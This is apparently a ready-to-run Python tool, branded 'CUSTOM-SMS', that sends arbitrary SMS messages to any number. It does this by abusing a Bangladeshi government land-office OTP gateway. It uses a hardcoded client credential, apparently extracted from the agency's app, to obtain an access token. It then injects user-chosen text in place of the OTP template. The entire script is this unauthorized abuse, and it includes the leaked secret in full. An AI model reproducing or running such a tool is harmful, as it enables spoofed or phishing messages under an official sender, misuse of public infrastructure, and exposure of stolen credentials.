import requests
from pprint import pprint
def main():
	print(logo)
logo = ("""
  
\033[1;34m
   ____ _   _ ____ _____ ___  __  __      ____  __  __ ____  
  / ___| | | / ___|_   _/ _ \|  \/  |    / ___||  \/  / ___| 
 | |   | | | \___ \ | || | | | |\/| |____\___ \| |\/| \___ \ 
 | |___| |_| |___) || || |_| | |  | |_____|__) | |  | |___) |
  \____|\___/|____/ |_| \___/|_|  |_|    |____/|_|  |_|____/ 
 \033[1;32m                                                            

             ██╗ ██████╗ ████████╗██╗  ██╗██╗
             ██║██╔═══██╗╚══██╔══╝██║  ██║██║
             ██║██║   ██║   ██║   ███████║██║
        ██   ██║██║   ██║   ██║   ██╔══██║██║
        ╚█████╔╝╚██████╔╝   ██║   ██║  ██║██║
         ╚════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝ 
         
         
         
         
         
""")
print(logo)
n = input("\033[1;37m𝐄𝐍𝐓𝐄𝐑 𝐍𝐔𝐌𝐁𝐄𝐑 : ")
m = input("\033[1;37m𝐄𝐍𝐓𝐄𝐑 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 : ")
print("\n")

tAPI = "https://idp.land.gov.bd/auth/realms/prod/protocol/openid-connect/token"

headers = {
    "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
    "content-type": "application/x-www-form-urlencoded; charset=utf-8",
    "accept-encoding": "gzip",
    "content-length": "29",
    "authorization": "Basic bXV0YXRpb24tYXBwLWNsaWVudDphWTBBNVhFdlpLZHNwOGJzM0ZKNklwa0l4TmJWcHpGNg==",
    "host": "idp.land.gov.bd"
}
data = {
    "grant_type": "client_credentials"
}

resp = requests.post(tAPI, headers=headers, data=data).json()
token = resp['access_token']

mAPI = "https://sms-api.land.gov.bd/api/broker-service/otp/send_otp"
headers = {
    "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
    "accept": "application/json",
    "accept-encoding": "gzip",
    "content-length": "112",
    "host": "sms-api.land.gov.bd",
    "authorization": f"Bearer {token}",
    "content-type": "application/json; charset=utf-8"
}
data = {
    "msgTmp": f"{m} $code",
    "destination": f"{n}",
    "otpType": "sms",
    "otpLength": 0
}

response = requests.post(mAPI, headers=headers, json=data).json()

if response['success'] == True and response['status']== 200:
    print(f"𝐒𝐌𝐒 𝐒𝐄𝐍𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝐓𝐎 {n} !!")
else:
    print("𝐒𝐌𝐒 𝐒𝐄𝐍𝐃 𝐅𝐀𝐈𝐋𝐄𝐃 !")
    pprint(response)
    
   

main()
